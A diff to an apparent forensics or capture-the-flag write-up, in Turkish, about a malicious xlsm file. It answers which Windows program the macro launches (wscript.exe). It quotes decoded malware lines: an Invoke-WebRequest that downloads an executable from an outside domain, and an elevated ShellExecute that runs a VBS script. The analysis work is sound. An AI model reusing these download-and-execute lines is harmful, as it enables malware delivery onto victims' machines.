@@ -1444,4 +1444,11 @@ Invoke-WebRequest -Uri http://ofbahar.com/BodyMassIndex.exe -OutFile C:\Users\Ri
 > A windows application is running from within the file with the “xlsm” extension. What is the name of this app?
 
 ## Solution
-
+40. soruda decode ettiğimiz kodları incelersek, wscript.exe ile notamalware.vbs dosyasının çalıştırıldığını farkediyoruz. EXCEL'i sormadığını varsayarsak cevabımız "wscript.exe"
+```
+    shellapp.ShellExecute "wscript.exe", "C:\Users\RickMartinGrimes\AppData\Local\Temp\notamalware.vbs", Null, "runas", 1
+```
+Cevap:
+```
+wscript.exe
+```
